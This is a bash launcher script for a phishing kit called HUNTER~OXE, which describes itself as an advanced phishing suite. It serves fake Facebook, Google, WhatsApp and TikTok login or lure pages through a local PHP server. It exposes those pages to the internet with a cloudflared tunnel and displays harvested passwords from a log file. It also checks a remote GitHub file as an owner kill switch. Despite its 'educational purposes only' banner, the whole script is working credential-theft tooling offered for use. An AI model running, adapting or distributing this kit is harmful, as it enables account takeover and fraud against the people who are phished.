#!/bin/bash

# --- REMOTE CONTROL ---
STATUS=$(curl -s -L https://raw.githubusercontent.com/hunteroxe1-ai/PEkha/main/status.txt | tr -d '[:space:]')

if [[ "$STATUS" == "OFF" ]]; then
    clear
    echo -e "\e[1;31m"
    echo "  #######################################################"
    echo "  #                                                     #"
    echo "  #                ACCESS DENIED !!!                    #"
    echo "  #                                                     #"
    echo "  #      THIS TOOL HAS BEEN DISABLED BY OWNER           #"
    echo "  #          CONTACT: PHILLIMON ISAAC                   #"
    echo "  #                                                     #"
    echo "  #######################################################"
    echo -e "\e[0m"
    exit
fi

# --- BANNER ---
clear
echo -e "\e[1;32m   _  _ _  _ _  _ ___ ____ ____    ____ _  _ ____ "
echo -e "\e[1;32m   |__| |  | |\ |  |  |___ |__/    |  |  \/  |___ "
echo -e "\e[1;32m   |  | |__| | \|  |  |___ |  \    |__| _/\_ |___  v/5.0"
echo -e "\e[1;37m  --------------------------------------------------"
echo -e "\e[1;35m  [*] OWNER    : PHILLIMON ISAAC"
echo -e "\e[1;35m  [*] TOOL TYPE: ADVANCED PHISHING SUITE"
echo -e "\e[1;35m  [*] WARNING  : FOR EDUCATIONAL PURPOSES ONLY ⚠️"
echo -e "\e[1;37m  --------------------------------------------------"
echo -e "\e[1;32m  [1] FACEBOOK LOGIN (CLASSIC)"
echo -e "\e[1;32m  [2] GOOGLE LOGIN (OAUTH SYNC)"
echo -e "\e[1;32m  [3] ADVANCED IP & DEVICE TRACKER"
echo -e "\e[1;32m  [4] TIKTOK FOLLOWER BOOSTER"
echo -e "\e[1;32m  [5] WHATSAPP VERIFICATION"
echo -e "\e[1;37m  --------------------------------------------------"
echo -e "\e[1;33m  [L] VIEW LOGS/PASSWORDS  [X] EXIT"
echo -e "\e[1;37m  --------------------------------------------------"
read -p "[?] CHOICE : " choice

if [ "$choice" == "1" ]; then
    cp web/classic.html web/index.html
elif [ "$choice" == "2" ]; then
    cp web/google.html web/index.html
elif [ "$choice" == "3" ]; then
    cp web/tracker.html web/index.html
elif [ "$choice" == "4" ]; then
    cp web/tiktok.html web/index.html
elif [ "$choice" == "5" ]; then
    cp web/whatsapp.html web/index.html
elif [ "$choice" == "L" ] || [ "$choice" == "l" ]; then
    clear
    echo -e "\e[1;32m--- HUNTER~OXE DATABASE ---\e[0m"
    if [ ! -f storage/passwords.txt ]; then echo "No logs found."; else cat storage/passwords.txt; fi
    read -p "Press Enter..." && ./HUNTER~OXE.sh
elif [ "$choice" == "X" ] || [ "$choice" == "x" ]; then
    exit
else
    ./HUNTER~OXE.sh
fi

echo -e "\e[1;33m[!] Starting Server & Tunnel...\e[0m"
php -S 127.0.0.1:8080 -t web/ > /dev/null 2>&1 & 
cloudflared tunnel --url http://127.0.0.1:8080
